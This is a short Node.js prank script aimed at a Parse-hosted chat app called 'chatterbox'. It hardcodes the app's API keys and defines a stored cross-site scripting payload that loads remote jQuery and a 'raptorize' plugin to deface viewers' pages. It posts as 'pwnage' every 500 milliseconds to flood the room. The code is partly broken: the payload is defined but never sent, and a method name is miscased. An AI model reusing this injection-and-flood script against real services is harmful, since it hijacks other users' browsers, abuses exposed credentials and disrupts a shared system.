var https = require('https');

var options = {
  host: 'api.parse.com',
  port: 443,
  path: '/1/classes/chatterbox',
  method: 'POST',
  headers: {
    "X-Parse-Application-Id": "voLazbq9nXuZuos9hsmprUz7JwM2N0asnPnUcI7r",
    "X-Parse-REST-API-Key": "QC2F43aSAghM97XidJw8Qiy1NXlpL5LR45rhAVAf"
  }
};

var request = https.request(options, function(response) {
  console.log('STATUS: ' + response.statusCode);
  console.log('HEADERS: ' + JSON.stringify(response.headers));
  response.SetEncoding('utf8');
  response.on('data', function(chunk) {
    console.log('BODY: ' + chunk);
  });
});

var raptorScript = ';<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script><script>!window.jQuery && document.write("<script src="jquery-1.4.3.min.js"><\/script>")</script><script src="jquery.raptorize.1.0.js"></script><script type="text/javascript">$(window).load(function(){$("body").append("<h2>RAPTORIZED - <3 MrNice </h2>");$(document).raptorize({"enterOn" : "timer", "delayTime" : 2000});});</script>';

var message = {
  username: 'pwnage',
  text: 'hello',
  roomname: 'all'
};

var raptorSend = function(){
  console.log("raptor sent!");
  request.write(JSON.stringify(message));
};

raptorSend();
setInterval(raptorSend, 500);
